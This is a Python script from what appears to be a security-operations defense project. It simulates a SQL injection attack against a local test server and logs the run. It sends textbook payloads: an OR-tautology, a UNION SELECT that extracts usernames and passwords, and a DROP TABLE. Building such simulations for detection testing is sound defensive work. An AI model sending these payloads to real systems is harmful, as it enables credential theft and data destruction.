import requests
import time
import sys
import os

ROOT_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "../"))
sys.path.append(ROOT_DIR)
from modules.soc_defense.core.json_logger import SOCLogger

def run_attack():
    print("[!] Starting SQL Injection Attack Simulation...")
    target_url = "http://127.0.0.1:5000/search"
    
    payloads = [
        "1", # Normal traffic
        "1' OR '1'='1", # Basic SQLi
        "1' UNION SELECT username, password FROM users --", # Advanced SQLi
        "'; DROP TABLE users; --" # Destructive SQLi
    ]
    
    success_count = 0
    t_start = time.time()
    
    for payload in payloads:
        print(f"[*] Sending payload: {payload}")
        try:
            response = requests.get(target_url, params={"id": payload})
            print(f"[*] Response Code: {response.status_code}")
            success_count += 1
        except Exception as e:
            print(f"[!] Error attacking target: {e}")
        time.sleep(1) # Slow down slightly to allow logging to catch up
        
    print("[+] Attack simulation completed.")
    
    soc_logger = SOCLogger(component_type="scripts", component_name="attack_simulation_sqli")
    soc_logger.log(
        event_type="simulation",
        input_data={"target": target_url, "payloads_sent": payloads},
        output_data={"successful_requests": success_count},
        status="success",
        metadata={"execution_time_ms": int((time.time() - t_start) * 1000)}
    )

if __name__ == "__main__":
    run_attack()
